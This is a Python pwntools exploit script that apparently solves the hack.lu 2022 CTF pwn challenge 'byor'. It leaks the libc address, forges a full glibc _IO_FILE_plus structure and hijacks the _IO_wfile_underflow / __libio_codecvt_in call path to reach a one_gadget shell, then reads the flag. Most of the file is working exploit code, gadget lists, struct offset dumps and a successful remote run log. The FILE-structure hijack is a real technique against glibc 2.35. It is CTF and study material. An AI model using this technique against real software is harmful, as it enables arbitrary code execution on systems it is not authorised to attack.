#!/usr/bin/python3

from pwn import *
from pwnlib.libcdb import unstrip_libc

elf = ELF('byor_local', checksec=False)
# elf = ELF('byor', checksec=False)
libc = ELF("./libc.so.6")
# unstrip_libc(libc.path)

context.terminal = ["remotinator", "vsplit", "-x"]

def get_conn(env=None):
	if env is None: env = {}
	
	if args.GDB:
		return gdb.debug(elf.path, '\n'.join([
			"dir ./glibc-2.35/",
			"b *main+88",
			"c"
		]), env=env)
	elif args.REMOTE:
		return remote('flu.xxx', 11801)
		# return remote('localhost', 4444)
	else:
		return process(elf.path, env=env)

io = get_conn()
r = lambda x: io.recv(x)
rl = lambda: io.recvline(keepends=False)
ru = lambda x: io.recvuntil(x, drop=True)
cl = lambda: io.clean(timeout=1)
s = lambda x: io.send(x)
sa = lambda x, y: io.sendafter(x, y)
sl = lambda x: io.sendline(x)
sla = lambda x, y: io.sendlineafter(x, y)
ia = lambda: io.interactive()
li = lambda s: log.info(s)
ls = lambda s: log.success(s)


ru(b'Here is your foundation: ')
stdout = int(rl().strip().decode(), 16)
ls(f'stdout {stdout:#x}')

libc.address = stdout - libc.symbols["_IO_2_1_stdout_"]
ls(f'libc.address {libc.address:#x}')

"""

pwndbg> ptype /o FILE
type = struct _IO_FILE {
/*      0      |       4 */    int _flags;
/* XXX  4-byte hole      */
/*      8      |       8 */    char *_IO_read_ptr;
/*     16      |       8 */    char *_IO_read_end;
/*     24      |       8 */    char *_IO_read_base;
/*     32      |       8 */    char *_IO_write_base;
/*     40      |       8 */    char *_IO_write_ptr;
/*     48      |       8 */    char *_IO_write_end;
/*     56      |       8 */    char *_IO_buf_base;
/*     64      |       8 */    char *_IO_buf_end;
/*     72      |       8 */    char *_IO_save_base;
/*     80      |       8 */    char *_IO_backup_base;
/*     88      |       8 */    char *_IO_save_end;
/*     96      |       8 */    struct _IO_marker *_markers;
/*    104      |       8 */    struct _IO_FILE *_chain;
/*    112      |       4 */    int _fileno;
/*    116      |       4 */    int _flags2;
/*    120      |       8 */    __off_t _old_offset;
/*    128      |       2 */    unsigned short _cur_column;
/*    130      |       1 */    signed char _vtable_offset;
/*    131      |       1 */    char _shortbuf[1];
/* XXX  4-byte hole      */
/*    136      |       8 */    _IO_lock_t *_lock;
/*    144      |       8 */    __off64_t _offset;
/*    152      |       8 */    struct _IO_codecvt *_codecvt;
/*    160      |       8 */    struct _IO_wide_data *_wide_data;
/*    168      |       8 */    struct _IO_FILE *_freeres_list;
/*    176      |       8 */    void *_freeres_buf;
/*    184      |       8 */    size_t __pad5;
/*    192      |       4 */    int _mode;
/*    196      |      20 */    char _unused2[20];

                               /* total size (bytes):  216 */
                             }

pwndbg> ptype /o struct _IO_FILE_plus
/* offset      |    size */  type = struct _IO_FILE_plus {
/*      0      |     216 */    FILE file;
/*    216      |       8 */    const struct _IO_jump_t *vtable;

                               /* total size (bytes):  224 */
                             }
"""

"""
wint_t
_IO_wfile_underflow (FILE *fp)
{
  struct _IO_codecvt *cd;
  enum __codecvt_result status;
  ssize_t count;

  /* C99 requires EOF to be "sticky".  */
  if (fp->_flags & _IO_EOF_SEEN)
    return WEOF;

  if (__glibc_unlikely (fp->_flags & _IO_NO_READS))
    {
      fp->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)
    return *fp->_wide_data->_IO_read_ptr;

  cd = fp->_codecvt;

  /* Maybe there is something left in the external buffer.  */
  if (fp->_IO_read_ptr < fp->_IO_read_end)
    {
      /* There is more in the external.  Convert it.  */
      const char *read_stop = (const char *) fp->_IO_read_ptr;

      fp->_wide_data->_IO_last_state = fp->_wide_data->_IO_state;
      fp->_wide_data->_IO_read_base = fp->_wide_data->_IO_read_ptr =
	fp->_wide_data->_IO_buf_base;
      status = __libio_codecvt_in (cd, &fp->_wide_data->_IO_state,
				   fp->_IO_read_ptr, fp->_IO_read_end,
				   &read_stop,
				   fp->_wide_data->_IO_read_ptr,
				   fp->_wide_data->_IO_buf_end,
				   &fp->_wide_data->_IO_read_end);
...


enum __codecvt_result
__libio_codecvt_in (struct _IO_codecvt *codecvt, __mbstate_t *statep,
		    const char *from_start, const char *from_end,
		    const char **from_stop,
		    wchar_t *to_start, wchar_t *to_end, wchar_t **to_stop)
{
  enum __codecvt_result result;

  struct __gconv_step *gs = codecvt->__cd_in.step;
  int status;
  size_t dummy;
  const unsigned char *from_start_copy = (unsigned char *) from_start;

  codecvt->__cd_in.step_data.__outbuf = (unsigned char *) to_start;
  codecvt->__cd_in.step_data.__outbufend = (unsigned char *) to_end;
  codecvt->__cd_in.step_data.__statep = statep;

  __gconv_fct fct = gs->__fct;
#ifdef PTR_DEMANGLE
  if (gs->__shlib_handle != NULL)
    PTR_DEMANGLE (fct);
#endif

  status = DL_CALL_FCT (fct,
			(gs, &codecvt->__cd_in.step_data, &from_start_copy,
			 (const unsigned char *) from_end, NULL,
			 &dummy, 0, 0));
"""


"""
pwndbg> ptype /o struct _IO_codecvt
/* offset      |    size */  type = struct _IO_codecvt {
/*      0      |      56 */    _IO_iconv_t __cd_in;
/*     56      |      56 */    _IO_iconv_t __cd_out;

                               /* total size (bytes):  112 */
                             }

pwndbg> ptype /o _IO_iconv_t
type = struct {
/*      0      |       8 */    struct __gconv_step *step;
/*      8      |      48 */    struct __gconv_step_data {
/*      8      |       8 */        unsigned char *__outbuf;
/*     16      |       8 */        unsigned char *__outbufend;
/*     24      |       4 */        int __flags;
/*     28      |       4 */        int __invocation_counter;
/*     32      |       4 */        int __internal_use;
/* XXX  4-byte hole      */
/*     40      |       8 */        __mbstate_t *__statep;
/*     48      |       8 */        __mbstate_t __state;

                                   /* total size (bytes):   48 */
                               } step_data;

                               /* total size (bytes):   56 */
                             }

pwndbg> ptype /o struct __gconv_step
/* offset      |    size */  type = struct __gconv_step {
/*      0      |       8 */    struct __gconv_loaded_object *__shlib_handle;
/*      8      |       8 */    const char *__modname;
/*     16      |       4 */    int __counter;
/* XXX  4-byte hole      */
/*     24      |       8 */    char *__from_name;
/*     32      |       8 */    char *__to_name;
/*     40      |       8 */    __gconv_fct __fct;
/*     48      |       8 */    __gconv_btowc_fct __btowc_fct;
/*     56      |       8 */    __gconv_init_fct __init_fct;
/*     64      |       8 */    __gconv_end_fct __end_fct;
/*     72      |       4 */    int __min_needed_from;
/*     76      |       4 */    int __max_needed_from;
/*     80      |       4 */    int __min_needed_to;
/*     84      |       4 */    int __max_needed_to;
/*     88      |       4 */    int __stateful;
/* XXX  4-byte hole      */
/*     96      |       8 */    void *__data;

                               /* total size (bytes):  104 */
                             }
"""

class File:
	def __init__(self) -> None:
		self.buf = bytearray(224)

	def write(self, offset, value):
		for i, b in enumerate(value):
			self.buf[offset+i] = b

one_gadgets = list(map(int, "330295 330307 330328 330336 527427 527440 527445 527450 965873 965877 965880 1104834 1104842 1104847 1104857".split(" ")))

# 0x000000000015382d : call r10
# 0x000000000010ad69 : call r11
# 0x000000000002b78d : call r12
# 0x000000000002f4d3 : call r13
# 0x000000000002b8b9 : call r14
# 0x0000000000029e19 : call r15
# 0x000000000007e185 : call r8
# 0x0000000000029d8e : call rax
# 0x000000000002b9cc : call rbp
# 0x000000000002aa9d : call rbx
# 0x0000000000029e66 : call rcx
# 0x0000000000029e1a : call rdi
# 0x0000000000036c06 : call rdx
# 0x000000000002b8ba : call rsi
# 0x000000000002b78e : call rsp

fp = File()
fp.write(0, p32(0xFBAD0000)) # _flags
fp.write(8, p64(0x1)) # _IO_read_ptr;                   
fp.write(16, p64(libc.address + one_gadgets[int(args.GADGET)])) # _IO_read_end;      used as rcx register value
fp.write(24, p64(0)) # _IO_read_base;                                           here __gconv_step struct starts, used as __shlib_handle, needs to be 0
fp.write(32, p64(0)) # _IO_write_base;
fp.write(40, p64(0)) # _IO_write_ptr;
fp.write(48, p64(0)) # _IO_write_end;
fp.write(56, p64(0)) # _IO_buf_base;
fp.write(64, p64(libc.address + 0x0000000000029e66)) # _IO_buf_end;       used as step->__fct
fp.write(72, p64(stdout+64-40)) # _IO_save_base;                                used as _IO_codecvt->__cd_in
fp.write(80, p64(0xAAAAAAAAAAAAAAAA)) # _IO_backup_base;                
fp.write(88, p64(0)) # _IO_save_end;   
fp.write(96, p64(0)) # _markers
fp.write(104, p64(libc.address + 0x219aa0)) # _chain
fp.write(112, p32(1)) # _fileno
fp.write(116, p32(0)) # _flags2
fp.write(120, p64(0xffffffffffffffff)) # _old_offset
fp.write(128, p16(0)) # _cur_column
fp.write(130, p8(0)) # _vtable_offset
fp.write(131, b'\x00' * 5)  # _shortbuf
fp.write(136, p64(libc.address + 0x21ba70)) # _lock
fp.write(144, p64(0xffffffffffffffff)) # _offset
fp.write(152, p64(stdout+72)) # _codecvt
fp.write(160, p64(0)) # _wide_data                                              
fp.write(168, p64(0)) # _freeres_list           
fp.write(176, p64(0)) # _freeres_buf
fp.write(184, p64(0)) # __pad5
fp.write(192, p32(0xffffffff)) # _mode
fp.write(196, p32(0) + p64(0) + p64(0)) # _unused2, 4B padding
fp.write(216, p64(libc.sym['_IO_wfile_jumps'] - 0x38 + 0x20)) # vtable, shift by the distance between __GI__IO_wfile_underflow and __GI__IO_wfile_xsputn

s(fp.buf)

# the idea is to call _IO_wfile_underflow -> __libio_codecvt_in -> DL_CALL_FCT -> call rcx (_IO_read_end) -> one_gadget
#  ► 0x7f2acb57de12 <__libio_codecvt_in+146>    call   rbp                           <exec_comm+697>
#         rdi: 0x7f2acb711798 (_IO_2_1_stdout_+24) ◂— 0x0
#         rsi: 0x7f2acb7117d0 (_IO_2_1_stdout_+80) ◂— 0x0
#         rdx: 0x7fffcd325e90 ◂— 0x0 (_IO_read_ptr)
#         rcx: 0x1


# conditions in _IO_wfile_underflow
# fp->_flags & _IO_EOF_SEEN == 0
# fp->_flags & _IO_NO_READS == 0
# fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end
# fp->_IO_read_ptr < fp->_IO_read_end

# conditions in __libio_codecvt_in
# gs->__shlib_handle == NULL

# sl(b"ls")
sl(b"cat flag.txt")
ia()
# try:
#     sleep(1)
#     sl(b"ls")
#     while True:
#         pass
# except:
#     pass


# 0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL
#   rbp == NULL || (u16)[rbp] == NULL

# 0x50a43 posix_spawn(rsp+0x1c, "/bin/sh", rdx, rbp, rsp+0x60, environ)
# constraints:
#   rsp & 0xf == 0
#   (u64)xmm0 == NULL
#   rdx == NULL || (s32)[rdx+0x4] <= 0
#   rbp == NULL || (u16)[rbp] == NULL

# 0x50a58 posix_spawn(rdi, "/bin/sh", rdx, rbp, r8, [rax])
# constraints:
#   rsp & 0xf == 0
#   [r8] == NULL
#   [[rax]] == NULL || [rax] == NULL
#   rdi == NULL || writable: rdi
#   rdx == NULL || (s32)[rdx+0x4] <= 0
#   rbp == NULL || (u16)[rbp] == NULL

# 0x50a60 posix_spawn(rdi, "/bin/sh", rdx, rcx, r8, [rax])
# constraints:
#   rsp & 0xf == 0
#   [r8] == NULL
#   [[rax]] == NULL || [rax] == NULL
#   rdi == NULL || writable: rdi
#   rdx == NULL || (s32)[rdx+0x4] <= 0
#   rcx == NULL || (u16)[rcx] == NULL

# 0x80c43 posix_spawn(rbx+0xe0, "/bin/sh", r12, 0, rsp+0x60, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL
#   rbx+0xe0 == NULL || writable: rbx+0xe0
#   r12 == NULL || (s32)[r12+0x4] <= 0

# 0x80c50 posix_spawn(rbx+0xe0, "/bin/sh", rdx, 0, rsp+0x60, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL
#   rbx+0xe0 == NULL || writable: rbx+0xe0
#   rdx == NULL || (s32)[rdx+0x4] <= 0

# 0x80c55 posix_spawn(rbx+0xe0, "/bin/sh", rdx, 0, rsp+0x60, environ)
# constraints:
#   rsp & 0xf == 0
#   (u64)xmm0 == NULL
#   rbx+0xe0 == NULL || writable: rbx+0xe0
#   rdx == NULL || (s32)[rdx+0x4] <= 0

# 0x80c5a posix_spawn(rbx+0xe0, "/bin/sh", rdx, 0, r8, environ)
# constraints:
#   p & 0xf == 0
#   [r8] == NULL
#   rbx+0xe0 == NULL || writable: rbx+0xe0
#   rdx == NULL || (s32)[rdx+0x4] <= 0

# 0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebcf5 execve("/bin/sh", r10, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebcf8 execve("/bin/sh", rsi, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

# 0x10dbc2 posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x40], 0, rsp+0x70, [rsp+0xf0])
# constraints:
#   [rsp+0x70] == NULL
#   [[rsp+0xf0]] == NULL || [rsp+0xf0] == NULL
#   [rsp+0x40] == NULL || (s32)[[rsp+0x40]+0x4] <= 0

# 0x10dbca posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x40], 0, rsp+0x70, r9)
# constraints:
#   [rsp+0x70] == NULL
#   [r9] == NULL || r9 == NULL
#   [rsp+0x40] == NULL || (s32)[[rsp+0x40]+0x4] <= 0

# 0x10dbcf posix_spawn(rsp+0x64, "/bin/sh", rdx, 0, rsp+0x70, r9)
# constraints:
#   [rsp+0x70] == NULL
#   [r9] == NULL || r9 == NULL
#   rdx == NULL || (s32)[rdx+0x4] <= 0

# 0x10dbd9 posix_spawn(rdi, "/bin/sh", rdx, 0, r8, r9)
# constraints:
#   [r8] == NULL
#   [r9] == NULL || r9 == NULL
#   rdi == NULL || writable: rdi
#   rdx == NULL || (s32)[rdx+0x4] <= 0


# after several runs

# ➜  /media/sf_D_DRIVE/hacklu_2022/byor ./solve.py REMOTE GADGET=6
# [*] '/media/sf_D_DRIVE/hacklu_2022/byor/libc.so.6'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [+] Opening connection to flu.xxx on port 11801: Done
# [+] stdout 0x7fd323423780
# [+] libc.address 0x7fd323209000
# [*] Switching to interactive mode
# flag{wh0_n33ds_w1de_dat4_vt4bl3s_4nyway5?}
# [*] Got EOF while reading in interactive

